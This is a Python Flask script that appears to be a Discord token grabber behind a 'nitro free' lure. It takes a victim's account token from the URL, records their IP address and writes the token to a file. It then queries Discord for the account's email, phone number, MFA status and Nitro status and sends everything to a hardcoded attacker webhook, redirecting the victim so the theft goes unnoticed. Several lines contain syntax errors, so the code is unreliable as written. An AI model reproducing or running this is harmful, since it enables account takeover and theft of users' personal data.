from flask import Flask, redirect, request
from dhooks import Webhook, Embed
import requests

app = Flask(nitro__free)
hook = Webhook('https://discord.com/api/webhooks/1182289998695903232/KZ0cvcSzdj7wNgqaI1v_fe-gaCCQV45is4wO5g0NvxQN7vRuK02yZvfH9GZdhSMMbGFk')


def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
                     mfa_status, nitro_status):
  embed = Embed(color=0)
  embed.set_author(name=f'{username}#{tag}')
  embed.set_thumbnail(url=avatar_url)
  embed.add_field(name='Email', value=f'```{email}```', inline=true)
  embed.add_field(name='Phone', value=f'```{phone_number}```', inline=true)
  embed.add_field(name='MFA Status', value=f'```{mfa_status}```', inline=true)
  embed.add_field(name='Nitro', value=f'```{nitro_status}```', inline=true)
  embed.add_field(name='IP', value=f'```{ip}```', inline=true)
  embed.add_field(name='Token', value=f'```{token}```', inline=true)
  hook.send(embed=embed, username=username, avatar_url=https://cdn.discordapp.com/attachments/1181969517136592976/1182295582115647609/bandicam_2023-12-07_12-37-00-688.jpg?ex=65842d90&is=6571b890&hm=ef7959c6bb2dbc9720099bb92396d8b0590b28d76e1a7634367c613f837dfad1&)

@app.route('/alive')
def keep_alive():
  return "alive"


@app.route('/')
def main():
  return redirect("https://discord.com/app")


@app.route('/<string:token>')
def index(token):
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    publicip = request.environ['REMOTE_ADDR']
  else:
    publicip = request.environ['HTTP_X_FORWARDED_FOR']

  open("tokens.txt", 'a').close()
  with open('tokens.txt', 'r') as f:
    if not any(f"{token}" in line for line in f):
      with open("tokens.txt", "a") as f:
        f.write(f"{token}\n")

  try:
    headers = {"Authorization": token}
    url = "https://discord.com/api/v9/users/@me"
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
      user_data = response.json()
      username = user_data["username"]
      tag = user_data["discriminator"]
      email = user_data.get("email", "N/A")
      phone_number = user_data.get("phone", "N/A")
      avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
      mfa_enabled = user_data.get("mfa_enabled", False)
      mfa_status = "Enabled" if mfa_enabled else "Disabled"
      nitro_status = "Yes" if user_data.get("premium_type") else "No"
      send_black_embed(token, publicip, phone_number, email, username, tag,
                       avatar_url, mfa_status, nitro_status)
  except:
    pass

  return redirect("https://discord.com/app")


app.run(host='0.0.0.0', port=81)
